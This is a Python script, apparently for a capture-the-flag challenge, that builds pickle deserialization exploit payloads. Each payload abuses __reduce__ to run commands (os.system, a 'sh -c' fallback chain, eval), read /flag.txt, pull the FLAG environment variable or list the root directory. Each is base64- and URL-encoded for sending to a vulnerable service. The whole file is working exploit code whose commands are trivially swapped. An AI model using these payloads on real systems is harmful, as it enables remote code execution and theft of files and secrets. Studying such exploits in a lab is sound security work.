import pickle
import base64
import urllib.parse
import os

print("=" * 80)
print("PICKLE DESERIALIZATION PAYLOAD GENERATOR")
print("=" * 80)

payloads = {}

# =============================================================================
# CORE EXPLOITATION PAYLOADS
# =============================================================================

print("\n[1] BASIC RCE USING OS.SYSTEM")
class RCE_System:
    def __reduce__(self):
        import os
        # Execute a command that produces output
        return (os.system, ("echo 'rce_executed_12345'",))

rce_sys = RCE_System()
pl_sys = base64.b64encode(pickle.dumps(rce_sys)).decode('utf-8')
payloads['rce_system'] = pl_sys
print(f"Base64: {pl_sys}")
print(f"URL-encoded: {urllib.parse.quote(pl_sys)}")

print("\n[2] RCE USING SUBPROCESS FOR OUTPUT CAPTURE")
class RCE_Subprocess:
    def __reduce__(self):
        import subprocess
        # Try reading common flag locations
        return (subprocess.check_output, (['cat', '/flag.txt'],))

rce_sub = RCE_Subprocess()
pl_sub = base64.b64encode(pickle.dumps(rce_sub)).decode('utf-8')
payloads['rce_subprocess'] = pl_sub
print(f"Base64: {pl_sub}")

print("\n[3] MULTI-STAGE COMMAND (FALLBACK CHAIN)")
class MultiStage:
    def __reduce__(self):
        import subprocess
        # Chain multiple commands to increase success rate
        cmd = "cat /flag.txt 2>/dev/null || cat flag.txt 2>/dev/null || ls /"
        return (subprocess.check_output, (['sh', '-c', cmd],))

multi_stage = MultiStage()
pl_multi = base64.b64encode(pickle.dumps(multi_stage)).decode('utf-8')
payloads['multi_stage'] = pl_multi
print(f"Base64: {pl_multi}")

print("\n[4] DIRECT FILE READ")
class FileRead:
    def __reduce__(self):
        # Direct file read attempt
        return (open, ('/flag.txt', 'r'))

file_read = FileRead()
pl_file = base64.b64encode(pickle.dumps(file_read)).decode('utf-8')
payloads['file_read'] = pl_file
print(f"Base64: {pl_file}")

print("\n[5] PYTHON EVAL FOR MAXIMUM FLEXIBILITY")
class PyEval:
    def __reduce__(self):
        # Use eval to execute arbitrary Python
        return (eval, ('open("/flag.txt").read()',))

py_eval = PyEval()
pl_eval = base64.b64encode(pickle.dumps(py_eval)).decode('utf-8')
payloads['py_eval'] = pl_eval
print(f"Base64: {pl_eval}")

print("\n[6] ENVIRONMENT VARIABLE EXTRACTION")
class EnvExtract:
    def __reduce__(self):
        import os
        # Look for flag in environment
        return (os.environ.get, ('FLAG', 'not_found'))

env_extract = EnvExtract()
pl_env = base64.b64encode(pickle.dumps(env_extract)).decode('utf-8')
payloads['env_extract'] = pl_env
print(f"Base64: {pl_env}")

print("\n[7] LIST DIRECTORY CONTENTS")
class ListDir:
    def __reduce__(self):
        import os
        return (os.listdir, ('/',))

list_dir = ListDir()
pl_ls = base64.b64encode(pickle.dumps(list_dir)).decode('utf-8')
payloads['list_dir'] = pl_ls
print(f"Base64: {pl_ls}")

